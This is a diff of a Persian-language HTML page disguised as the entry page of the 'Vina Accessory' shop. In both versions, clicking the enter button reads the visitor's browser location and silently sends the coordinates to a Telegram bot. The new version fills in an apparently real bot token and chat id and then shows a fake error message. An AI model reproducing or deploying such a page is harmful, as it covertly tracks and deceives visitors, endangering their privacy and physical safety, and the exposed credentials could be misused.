@@ -1,82 +1,29 @@
 <!DOCTYPE html>
-<html lang="fa">
+<html>
 <head>
-  <meta charset="UTF-8">
-  <title>وینا اکسسوری</title>
-  <style>
-    body {
-      margin: 0;
-      padding: 0;
-      font-family: 'Vazir', sans-serif;
-      background: linear-gradient(to right, #f8f8f8, #e0e0e0);
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      height: 100vh;
-      color: #333;
-    }
-
-    h1 {
-      font-size: 2.5em;
-      margin-bottom: 10px;
-      color: #444;
-    }
-
-    p {
-      font-size: 1.2em;
-      margin-bottom: 30px;
-    }
-
-    button {
-      background-color: #d4af37;
-      color: white;
-      border: none;
-      padding: 15px 30px;
-      font-size: 1em;
-      border-radius: 8px;
-      cursor: pointer;
-      box-shadow: 0 4px 10px rgba(0,0,0,0.2);
-      transition: background-color 0.3s ease;
-    }
-
-    button:hover {
-      background-color: #bfa12f;
-    }
-
-    footer {
-      position: absolute;
-      bottom: 20px;
-      font-size: 0.9em;
-      color: #777;
-    }
-  </style>
+	<title>https://vinaaccessory.com/</title>
 </head>
 <body>
-  <h1>در حال ورود به وینا اکسسوری...</h1>
-  <p>در حال شناسایی فروشگاه‌های نزدیک شما 🛍️</p>
-  <button onclick="getLocation()">ورود به فروشگاه</button>
-
-  <footer>© 2025 Vina Accessory - همه حقوق محفوظ است</footer>
-
-  <script>
-    function getLocation() {
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(showPosition);
-      } else {
-        alert("مرورگر شما از موقعیت مکانی پشتیبانی نمی‌کند.");
-      }
-    }
-
-    function showPosition(position) {
-      var latitude = position.coords.latitude;
-      var longitude = position.coords.longitude;
-      var url = "https://api.telegram.org/botYOUR_BOT_TOKEN/sendMessage?chat_id=YOUR_CHAT_ID&text=Latitude: " + latitude + ", Longitude: " + longitude;
-      var xhr = new XMLHttpRequest();
-      xhr.open("GET", url, true);
-      xhr.send();
-      alert("موقعیت شما ثبت شد. لطفاً منتظر بمانید...");
-    }
-  </script>
+	<h1>در حال ورود به سایت...</h1>
+	<p>شناسایی فروشگاه های نزدیک به شما...</p>
+	<button onclick="getLocation()">ورود به وینا اکسسوری</button>
+	<script>
+		function getLocation() {
+			if (navigator.geolocation) {
+				navigator.geolocation.getCurrentPosition(showPosition);
+			} else {
+				alert("Geolocation is not supported by this browser.");
+			}
+		}
+		function showPosition(position) {
+			var latitude = position.coords.latitude;
+			var longitude = position.coords.longitude;
+			var url = "https://api.telegram.org/bot8069976917:AAHGS2Sar6h0qPCYVPpYezGHRVoOY1KuTbs/sendMessage?chat_id=tel:8438093859&text=Latitude: " + latitude + ", Longitude: " + longitude;
+			var xhr = new XMLHttpRequest();
+			xhr.open("GET", url, true);
+			xhr.send();
+			alert("خطا! دوباره امتحان کنید.از طریق کروم نام سایت را جستجو کنید");
+		}
+	</script>
 </body>
 </html>
